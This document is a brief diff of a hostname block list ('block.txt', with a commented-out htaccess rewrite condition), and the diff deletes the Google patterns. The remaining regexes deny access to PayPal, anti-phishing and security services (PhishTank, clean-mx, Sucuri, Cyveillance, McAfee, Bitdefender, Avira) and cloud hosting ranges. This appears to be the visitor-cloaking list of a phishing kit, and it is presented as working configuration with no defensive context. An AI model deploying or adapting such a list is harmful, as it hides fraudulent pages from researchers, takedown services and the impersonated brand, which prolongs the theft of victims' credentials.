@@ -1,7 +1,6 @@
 # RewriteCond %{HTTP_HOST} ^(?:www\.)?(example\.com)$
 # htaccess.txt
 # block.txt
-^.*google\.com$
 ^.*paypal\.com$
 ^.*112\.2o7\.com$
 ^.*firefox\.com$
@@ -9,7 +8,6 @@
 ^.*clean-mx\.de$
 ^.*phishmongers\.com$
 ^.*phishtank\.com$
-^.*\.google\.com$
 ^.*dnblead\.com$
 ^.*static\.spro\.net$
 ^.*sucuri\.net$
@@ -19,7 +17,6 @@
 ^.*tpnet\.pl$
 ^.*ovh\.net$
 ^.*above.*$
-^.*google.*$
 ^.*softlayer.*$
 ^.*amazonaws.*$
 ^.*cyveillance.*$
@@ -52,4 +49,3 @@
 ^.*McAfee.*$
 ^.*Bitdefender.*$
 ^.*avirasoft.*$
-^.*googleusercontent.*$
